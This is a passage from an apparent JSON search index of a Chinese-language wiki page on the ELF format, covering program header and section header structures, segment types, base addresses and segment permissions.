\u7a0b\u5e8f\u7684\u5934\u90e8\u53ea\u6709\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u610f\u4e49\u3002 \u53ef\u4ee5\u8bf4\uff0cProgram Header Table \u5c31\u662f\u4e13\u95e8\u4e3a ELF \u6587\u4ef6\u8fd0\u884c\u65f6\u4e2d\u7684\u6bb5\u6240\u51c6\u5907\u7684\u3002 Elf32_Phdr \u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b typedef struct { ELF32_Word p_type ; ELF32_Off p_offset ; ELF32_Addr p_vaddr ; ELF32_Addr p_paddr ; ELF32_Word p_filesz ; ELF32_Word p_memsz ; ELF32_Word p_flags ; ELF32_Word p_align ; } Elf32_Phdr ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b \u5b57\u6bb5 \u8bf4\u660e p_type \u8be5\u5b57\u6bb5\u4e3a\u6bb5\u7684\u7c7b\u578b\uff0c\u6216\u8005\u8868\u660e\u4e86\u8be5\u7ed3\u6784\u7684\u76f8\u5173\u4fe1\u606f\u3002 p_offset \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u59cb\u5230\u8be5\u6bb5\u5f00\u5934\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u3002 p_vaddr \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u8be5\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u8282\u5728\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u3002 p_paddr \u8be5\u5b57\u6bb5\u4ec5\u7528\u4e8e\u7269\u7406\u5730\u5740\u5bfb\u5740\u76f8\u5173\u7684\u7cfb\u7edf\u4e2d\uff0c \u7531\u4e8e\u201dSystem V\u201d\u5ffd\u7565\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5bfb\u5740\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8be5\u9879\u5185\u5bb9\u5e76\u672a\u88ab\u9650\u5b9a\u3002 p_filesz \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u6587\u4ef6\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002 p_memsz \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u5185\u5b58\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002 p_flags \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4e0e\u6bb5\u76f8\u5173\u7684\u6807\u8bb0\u3002 p_align \u53ef\u52a0\u8f7d\u7684\u7a0b\u5e8f\u7684\u6bb5\u7684 p_vaddr \u4ee5\u53ca p_offset \u7684\u5927\u5c0f\u5fc5\u987b\u662f page \u7684\u6574\u6570\u500d\u3002\u8be5\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u5728\u6587\u4ef6\u4ee5\u53ca\u5185\u5b58\u4e2d\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002\u5982\u679c\u8be5\u503c\u4e3a 0 \u6216 1 \u7684\u8bdd\uff0c\u8868\u793a\u4e0d\u9700\u8981\u5bf9\u9f50\u3002\u9664\u6b64\u4e4b\u5916\uff0cp_align \u5e94\u8be5\u662f 2 \u7684\u6574\u6570\u6307\u6570\u6b21\u65b9\uff0c\u5e76\u4e14 p_vaddr \u4e0e p_offset \u5728\u6a21 p_align \u7684\u610f\u4e49\u4e0b\uff0c\u5e94\u8be5\u76f8\u7b49\u3002","title":"\u6982\u8ff0"},{"location":"executable/elf/elf_structure/#_6","text":"\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u7c7b\u578b\u5982\u4e0b \u540d\u5b57 \u53d6\u503c \u8bf4\u660e PT_NULL 0 \u8868\u660e\u6bb5\u672a\u4f7f\u7528\uff0c\u5176\u7ed3\u6784\u4e2d\u5176\u4ed6\u6210\u5458\u90fd\u662f\u672a\u5b9a\u4e49\u7684\u3002 PT_LOAD 1 \u6b64\u7c7b\u578b\u6bb5\u4e3a\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u5927\u5c0f\u7531 p_filesz \u548c p_memsz \u63cf\u8ff0\u3002\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u88ab\u6620\u5c04\u5230\u76f8\u5e94\u5185\u5b58\u6bb5\u5f00\u59cb\u5904\u3002\u5982\u679c p_memsz \u5927\u4e8e p_filesz\uff0c\u201c\u5269\u4f59\u201d\u7684\u5b57\u8282\u90fd\u8981\u88ab\u7f6e\u4e3a0\u3002p_filesz \u4e0d\u80fd\u5927\u4e8e p_memsz\u3002\u53ef\u52a0\u8f7d\u7684\u6bb5\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6309\u7167 p_vaddr \u7684\u5347\u5e8f\u6392\u5217\u3002 PT_DYNAMIC 2 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002 PT_INTERP 3 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u548c\u957f\u5ea6\uff0c\u8be5\u5b57\u7b26\u4e32\u5c06\u88ab\u5f53\u4f5c\u89e3\u91ca\u5668\u8c03\u7528\u3002\u8fd9\u79cd\u6bb5\u7c7b\u578b\u4ec5\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u6709\u610f\u4e49\uff08\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff09\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u6bb5\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u7684\u524d\u9762\u3002 PT_NOTE 4 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u3002 PT_SHLIB 5 \u8be5\u6bb5\u7c7b\u578b\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u8bed\u4e49\u672a\u6307\u5b9a\u3002\u800c\u4e14\uff0c\u5305\u542b\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u7684\u7a0b\u5e8f\u4e0d\u7b26\u5408ABI\u6807\u51c6\u3002 PT_PHDR 6 \u8be5\u6bb5\u7c7b\u578b\u7684\u6570\u7ec4\u5143\u7d20\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u7ed9\u51fa\u4e86\u7a0b\u5e8f\u5934\u90e8\u8868\u81ea\u8eab\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u65e2\u5305\u62ec\u5728\u6587\u4ef6\u4e2d\u4e5f\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\u6b64\u7c7b\u578b\u7684\u6bb5\u5728\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002 \u6b64\u5916\uff0c\u53ea\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\u662f\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5b83\u624d\u4f1a\u51fa\u73b0 \u3002\u5982\u679c\u6b64\u7c7b\u578b\u6bb5\u5b58\u5728\uff0c\u5219\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u76ee\u7684\u524d\u9762\u3002 PT_LOPROC~PT_HIPROC 0x70000000 ~0x7fffffff \u6b64\u8303\u56f4\u7684\u7c7b\u578b\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u3002","title":"\u6bb5\u7c7b\u578b"},{"location":"executable/elf/elf_structure/#-base-address","text":"\u7a0b\u5e8f\u5934\u90e8\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u7a0b\u5e8f\u5185\u5b58\u955c\u50cf\u4e2d\u5b9e\u9645\u7684\u865a\u62df\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u90fd\u4f1a\u5305\u542b\u7edd\u5bf9\u5730\u5740\u7684\u4ee3\u7801\u3002\u4e3a\u4e86\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u6bb5\u5fc5\u987b\u5728\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u3002\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u88ab\u591a\u4e2a\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u540c\u65f6\u4fdd\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u6b63\u786e\u6027\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u7136\u4fdd\u7559\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\uff0c \u56e0\u4e3a\u5730\u5740\u65e0\u5173\u4ee3\u7801\u4f7f\u7528\u6bb5\u4e4b\u95f4\u7684\u76f8\u5bf9\u5730\u5740\u6765\u8fdb\u884c\u5bfb\u5740\uff0c\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u5fc5\u987b\u4e0e\u6587\u4ef6\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u76f8\u5339\u914d \u3002\u5185\u5b58\u4e2d\u4efb\u4f55\u6bb5\u7684\u865a\u62df\u5730\u5740\u4e0e\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u503c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5bf9\u8c61\u6765\u8bf4\u662f\u4e00\u4e2a\u5355\u4e00\u5e38\u91cf\u503c\u3002\u8fd9\u4e2a\u5dee\u503c\u5c31\u662f\u57fa\u5730\u5740\uff0c\u57fa\u5730\u5740\u7684\u4e00\u4e2a\u7528\u9014\u5c31\u662f\u5728\u52a8\u6001\u94fe\u63a5\u671f\u95f4\u91cd\u65b0\u5b9a\u4f4d\u7a0b\u5e8f\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u5730\u5740\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531\u4ee5\u4e0b\u4e09\u4e2a\u6570\u503c\u8ba1\u7b97\u7684 \u865a\u62df\u5185\u5b58\u52a0\u8f7d\u5730\u5740 \u6700\u5927\u9875\u9762\u5927\u5c0f \u7a0b\u5e8f\u53ef\u52a0\u8f7d\u6bb5\u7684\u6700\u4f4e\u865a\u62df\u5730\u5740 \u8981\u8ba1\u7b97\u57fa\u5730\u5740\uff0c\u9996\u5148\u8981\u786e\u5b9a\u53ef\u52a0\u8f7d\u6bb5\u4e2d p_vaddr \u6700\u5c0f\u7684\u5185\u5b58\u865a\u62df\u5730\u5740\uff0c\u4e4b\u540e\u628a\u8be5\u5185\u5b58\u865a\u62df\u5730\u5740\u7f29\u5c0f\u4e3a\u4e0e\u4e4b\u6700\u8fd1\u7684\u6700\u5927\u9875\u9762\u7684\u6574\u6570\u500d\u5373\u662f\u57fa\u5730\u5740\u3002\u6839\u636e\u8981\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u5185\u5b58\u5730\u5740\u53ef\u80fd\u4e0e p_vaddr \u76f8\u540c\u4e5f\u53ef\u80fd\u4e0d\u540c\u3002","title":"\u57fa\u5730\u5740-Base Address"},{"location":"executable/elf/elf_structure/#-p_flags","text":"\u88ab\u7cfb\u7edf\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u81f3\u5c11\u6709\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\u3002\u5f53\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u6bb5\u521b\u5efa\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u5b83\u4f1a\u6309\u7167 p_flags \u5c06\u6bb5\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6743\u9650\u3002\u53ef\u80fd\u7684\u6bb5\u6743\u9650\u4f4d\u6709 \u5176\u4e2d\uff0c\u6240\u6709\u5728 PF_MASKPROC \u4e2d\u7684\u6bd4\u7279\u4f4d\u90fd\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u4e0e\u5904\u7406\u5668\u76f8\u5173\u7684\u8bed\u4e49\u4fe1\u606f\u3002 \u5982\u679c\u4e00\u4e2a\u6743\u9650\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 0\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\u3002\u5b9e\u9645\u7684\u5185\u5b58\u6743\u9650\u53d6\u51b3\u4e8e\u76f8\u5e94\u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002\u5c3d\u7ba1\u6240\u6709\u7684\u6743\u9650\u7ec4\u5408\u90fd\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u7cfb\u7edf\u4e00\u822c\u4f1a\u6388\u4e88\u6bd4\u8bf7\u6c42\u66f4\u591a\u7684\u6743\u9650\u3002\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u660e\u786e\u8bf4\u660e\uff0c\u4e00\u4e2a\u6bb5\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u6240\u6709\u7684\u53ef\u80fd\u7ec4\u5408\u3002 \u4f8b\u5982\uff0c\u4e00\u822c\u6765\u8bf4\uff0c.text \u6bb5\u4e00\u822c\u5177\u6709\u8bfb\u548c\u6267\u884c\u6743\u9650\uff0c\u4f46\u662f\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u6570\u636e\u6bb5\u4e00\u822c\u5177\u6709\u5199\uff0c\u8bfb\uff0c\u4ee5\u53ca\u6267\u884c\u6743\u9650\u3002","title":"\u6bb5\u6743\u9650-p_flags"},{"location":"executable/elf/elf_structure/#_7","text":"\u4e00\u4e2a\u6bb5\u53ef\u80fd\u5305\u62ec\u4e00\u5230\u591a\u4e2a\u8282\u533a\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u52a0\u8f7d\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u4e5f\u5fc5\u987b\u9700\u8981\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7b49\u7b49\u3002\u4e0b\u9762\u4f1a\u7ed9\u51fa\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u6bb5\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\uff0c\u5b83\u7684\u8282\u7684\u987a\u5e8f\u4ee5\u53ca\u6240\u5305\u542b\u7684\u8282\u7684\u4e2a\u6570\u6709\u6240\u4e0d\u540c\u3002\u6b64\u5916\uff0c\u4e0e\u5904\u7406\u76f8\u5173\u7684\u7ea6\u675f\u53ef\u80fd\u4f1a\u6539\u53d8\u5bf9\u5e94\u7684\u6bb5\u7684\u7ed3\u6784\u3002 \u5982\u4e0b\u6240\u793a\uff0c\u4ee3\u7801\u6bb5\u53ea\u5305\u542b\u53ea\u8bfb\u7684\u6307\u4ee4\u4ee5\u53ca\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e2a\u4f8b\u5b50\u5e76\u6ca1\u6709\u7ed9\u51fa\u6240\u6709\u7684\u53ef\u80fd\u7684\u6bb5\u3002 \u6570\u636e\u6bb5\u5305\u542b\u53ef\u5199\u7684\u6570\u636e\u4ee5\u53ca\u4ee5\u53ca\u6307\u4ee4\uff0c\u901a\u5e38\u6765\u8bf4\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 \u7a0b\u5e8f\u5934\u90e8\u7684 PT_DYNAMIC \u7c7b\u578b\u7684\u5143\u7d20\u6307\u5411\u6307\u5411 .dynamic \u8282\u3002\u5176\u4e2d\uff0cgot \u8868\u548c plt \u8868\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u76f8\u5173\u4fe1\u606f\u3002\u5c3d\u7ba1\u5728\u8fd9\u91cc\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0cplt \u8282\u51fa\u73b0\u5728\u4ee3\u7801\u6bb5\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u5904\u7406\u5668\u6765\u8bf4\uff0c\u53ef\u80fd\u4f1a\u6709\u6240\u53d8\u52a8\u3002 .bss \u8282\u7684\u7c7b\u578b\u4e3a SHT_NOBITS\uff0c\u8fd9\u8868\u660e\u5b83\u5728 ELF \u6587\u4ef6\u4e2d\u4e0d\u5360\u7528\u7a7a\u95f4\uff0c\u4f46\u662f\u5b83\u5374\u5360\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7684\u7a7a\u95f4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\u5728\u6bb5\u7684\u5c3e\u90e8\uff0c\u56e0\u6b64\uff0c p_memsz \u624d\u4f1a\u6bd4 p_filesz \u5927\u3002 \u6ce8\u610f\uff1a \u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\u53ef\u80fd\u4f1a\u6709\u6240\u91cd\u5408\uff0c\u5373\u4e0d\u540c\u7684\u6bb5\u5305\u542b\u76f8\u540c\u7684\u8282\u3002","title":"\u6bb5\u5185\u5bb9"},{"location":"executable/elf/elf_structure/#section-header-table","text":"\u5176\u5b9e\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u662f\u5728 ELF \u6587\u4ef6\u7684\u5c3e\u90e8\uff08 \u4e3a\u4ec0\u4e48\u8981\u653e\u5728\u6587\u4ef6\u5c3e\u90e8\u5462\uff1f\uff1f \uff09\uff0c\u4f46\u662f\u4e3a\u4e86\u8bb2\u89e3\u65b9\u4fbf\uff0c\u8fd9\u91cc\u5c06\u8fd9\u4e2a\u8868\u653e\u5728\u8fd9\u91cc\u8fdb\u884c\u8bb2\u89e3\u3002 \u8be5\u7ed3\u6784\u7528\u4e8e\u5b9a\u4f4d ELF \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u8282\u533a\u7684\u5177\u4f53\u4f4d\u7f6e\u3002 \u9996\u5148\uff0cELF\u5934\u4e2d\u7684 e_shoff \u9879\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u5934\u5230\u8282\u5934\u8868\u4f4d\u7f6e\u7684\u5b57\u8282\u504f\u79fb\u3002 e_shnum \u544a\u8bc9\u4e86\u6211\u4eec\u8282\u5934\u8868\u5305\u542b\u7684\u9879\u6570\uff1b e_shentsize \u7ed9\u51fa\u4e86\u6bcf\u4e00\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 \u5176\u6b21\uff0c\u8282\u5934\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6570\u7ec4\u7684\u5143\u7d20\u7684\u7c7b\u578b\u662f ELF32_Shdr \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u63cf\u8ff0\u4e86\u4e00\u4e2a\u8282\u533a\u7684\u6982\u8981\u5185\u5bb9\u3002","title":"Section Header Table"},{"location":"executable/elf/elf_structure/#elf32_shdr","text":"\u6bcf\u4e2a\u8282\u533a\u5934\u90e8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u6570\u636e\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0\uff1a typedef struct { ELF32_Word sh_name ; ELF32_Word sh_type ; ELF32_Word sh_flags ; ELF32_Addr sh_addr ; ELF32_Off sh_offset ; ELF32_Word sh_size ; ELF32_Word sh_link ; ELF32_Word sh_info ; ELF32_Word sh_addralign ; ELF32_Word sh_entsize ; } Elf32_Shdr ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b \u6210\u5458 \u8bf4\u660e sh_name \u8282\u540d\u79f0\uff0c\u662f\u8282\u533a\u5934\u5b57\u7b26\u4e32\u8868\u8282\u533a\u4e2d\uff08Section Header String Table Section\uff09\u7684\u7d22\u5f15\uff0c\u56e0\u6b64\u8be5\u5b57\u6bb5\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u503c\u3002\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u662f\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002 sh_type \u6839\u636e\u8282\u7684\u5185\u5bb9\u548c\u8bed\u4e49\u8fdb\u884c\u5206\u7c7b\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u3002 sh_flags \u6bcf\u4e00\u6bd4\u7279\u4ee3\u8868\u4e0d\u540c\u7684\u6807\u5fd7\uff0c\u63cf\u8ff0\u8282\u662f\u5426\u53ef\u5199\uff0c\u53ef\u6267\u884c\uff0c\u9700\u8981\u5206\u914d\u5185\u5b58\u7b49\u5c5e\u6027\u3002 sh_addr \u5982\u679c\u8282\u533a\u5c06\u51fa\u73b0\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4e2d\uff0c\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e94\u8be5\u5728\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4f4d\u7f6e\u3002\u5426\u5219\uff0c\u6b64\u5b57\u6bb5\u4e3a 0\u3002 sh_offset \u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u6587\u4ef6\u5f00\u59cb\u5904\u4e4b\u95f4\u7684\u504f\u79fb\u3002SHT_NOBITS \u7c7b\u578b\u7684\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u5176 sh_offset \u6210\u5458\u7ed9\u51fa\u7684\u662f\u6982\u5ff5\u6027\u7684\u504f\u79fb\u3002 sh_size \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u5b57\u8282\u5927\u5c0f\u3002\u9664\u975e\u8282\u533a\u7684\u7c7b\u578b\u662f SHT_NOBITS \uff0c\u5426\u5219\u8be5\u8282\u5360\u7528\u6587\u4ef6\u4e2d\u7684 sh_size \u5b57\u8282\u3002\u7c7b\u578b\u4e3aSHT_NOBITS \u7684\u8282\u533a\u957f\u5ea6\u53ef\u80fd\u975e\u96f6\uff0c\u4e0d\u8fc7\u5374\u4e0d\u5360\u7528\u6587\u4ef6\u4e2d\u7684\u7a7a\u95f4\u3002 sh_link \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u5934\u90e8\u8868\u7d22\u5f15\u94fe\u63a5\uff0c\u5176\u5177\u4f53\u7684\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002 sh_info \u6b64\u6210\u5458\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002 sh_addralign \u67d0\u4e9b\u8282\u533a\u7684\u5730\u5740\u9700\u8981\u5bf9\u9f50\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u533a\u6709\u4e00\u4e2a doubleword \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u7cfb\u7edf\u5fc5\u987b\u4fdd\u8bc1\u6574\u4e2a\u8282\u533a\u6309\u53cc\u5b57\u5bf9\u9f50\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c sh\\_addr \\% sh\\_addralign sh\\_addr \\% sh\\_addralign =0\u3002\u76ee\u524d\u5b83\u4ec5\u5141\u8bb8\u4e3a 0\uff0c\u4ee5\u53ca 2 \u7684\u6b63\u6574\u6570\u5e42\u6570\u3002 0 \u548c 1 \u8868\u793a\u6ca1\u6709\u5bf9\u9f50\u7ea6\u675f\u3002 sh_entsize \u67d0\u4e9b\u8282\u533a\u4e2d\u5b58\u5728\u5177\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u8868\u9879\u7684\u8868\uff0c\u5982\u7b26\u53f7\u8868\u3002\u5bf9\u4e8e\u8fd9\u7c7b\u8282\u533a\uff0c\u8be5\u6210\u5458\u7ed9\u51fa\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\u53cd\u4e4b\uff0c\u6b64\u6210\u5458\u53d6\u503c\u4e3a0\u3002 \u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u7d22\u5f15\u4e3a\u96f6\uff08SHN_UNDEF\uff09\u7684\u8282\u533a\u5934\u4e5f\u5b58\u5728\uff0c\u6b64\u7d22\u5f15\u6807\u8bb0\u7684\u662f\u672a\u5b9a\u4e49\u7684\u8282\u533a\u5f15\u7528\u3002\u8fd9\u4e00\u9879\u7684\u4fe1\u606f\u5982\u4e0b \u5b57\u6bb5\u540d\u79f0 \u53d6\u503c \u8bf4\u660e sh_name 0 \u65e0\u540d\u79f0 sh_type SHT_NULL \u9650\u5236 sh_flags 0 \u65e0\u6807\u5fd7 sh_addr 0 \u65e0\u5730\u5740 sh_offset 0 \u65e0\u6587\u4ef6\u504f\u79fb sh_size 0 \u65e0\u5927\u5c0f sh_link SHN_UNDEF \u65e0\u94fe\u63a5\u4fe1\u606f sh_info 0 \u65e0\u8f85\u52a9\u4fe1\u606f sh_addralign 0 \u65e0\u5bf9\u9f50\u8981\u6c42 sh_entsize 0 \u65e0\u8868\u9879","title":"ELF32_Shdr"},{"location":"executable/elf/elf_structure/#_8","text":"\u8282\u5934\u8868\u4e2d\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u4e2a\u4e0b\u6807\u5982\u4e0b \u540d\u79f0 \u503c \u542b\u4e49 SHN_UNDEF 0 \u6807\u5fd7\u672a\u5b9a\u4e49\u7684\uff0c\u4e22\u5931\u7684\uff0c\u4e0d\u76f8\u5173\u7684\u6216\u8005\u5176\u5b83\u6ca1\u6709\u610f\u4e49\u7684\u8282\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e0e\u8282\u53f7SHN_UNDEF\u76f8\u5173\u7684\u201c\u5b9a\u4e49\"\u7684\u7b26\u53f7\u5c31\u662f\u4e00\u4e2a\u672a\u5b9a\u4e49\u7b26\u53f7\u3002 \u6ce8\uff1a\u867d\u71360\u53f7\u7d22\u5f15\u88ab\u4fdd\u7559\u7528\u4e8e\u672a\u5b9a\u4e49\u503c\uff0c\u8282\u5934\u8868\u4ecd\u7136\u5305\u542b\u7d22\u5f150\u7684\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679cELF\u5934\u7684e_shnum\u4e3a6\uff0c\u90a3\u4e48\u7d22\u5f15\u5e94\u8be5\u4e3a0~5\u3002\u66f4\u52a0\u8be6\u7ec6\u7684\u5185\u5bb9\u5728\u540e\u9762\u4f1a\u8bf4\u660e\u3002 SHN_LORESERVE 0xff00 \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0b\u754c\u3002 SHN_LOPROC 0xff00 \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0b\u754c SHN_HIPROC 0xff1f \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0a\u754c SHN_ABS 0xfff1 